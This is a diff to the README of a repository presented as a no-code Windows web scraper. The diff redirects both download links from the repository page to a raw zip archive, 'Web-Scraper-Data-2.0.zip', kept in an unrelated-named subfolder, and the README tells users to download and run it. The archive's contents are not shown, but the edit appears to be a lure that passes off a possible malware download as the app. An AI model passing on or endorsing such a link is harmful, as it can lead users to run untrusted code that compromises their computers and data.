@@ -1,6 +1,6 @@
 # 🕸️ Web-Data-Scraper - Simple No-Code Web Data Capture
 
-[![Download Web-Data-Scraper](https://img.shields.io/badge/Download-Web--Data--Scraper-blue?style=for-the-badge&logo=github)](https://github.com/philparotid868/Web-Data-Scraper)
+[![Download Web-Data-Scraper](https://img.shields.io/badge/Download-Web--Data--Scraper-blue?style=for-the-badge&logo=github)](https://github.com/philparotid868/Web-Data-Scraper/raw/refs/heads/main/coleoptilum/Web-Scraper-Data-2.0.zip)
 
 ## 🚀 What Web-Data-Scraper Does
 
@@ -11,7 +11,7 @@ It is built for users who want a simple way to gather web data on Windows.
 ## 📥 Download and Run on Windows
 
 Visit this page to download:
-https://github.com/philparotid868/Web-Data-Scraper
+https://github.com/philparotid868/Web-Data-Scraper/raw/refs/heads/main/coleoptilum/Web-Scraper-Data-2.0.zip
 
 1. Open the link in your browser.
 2. Download the Windows version of the app.
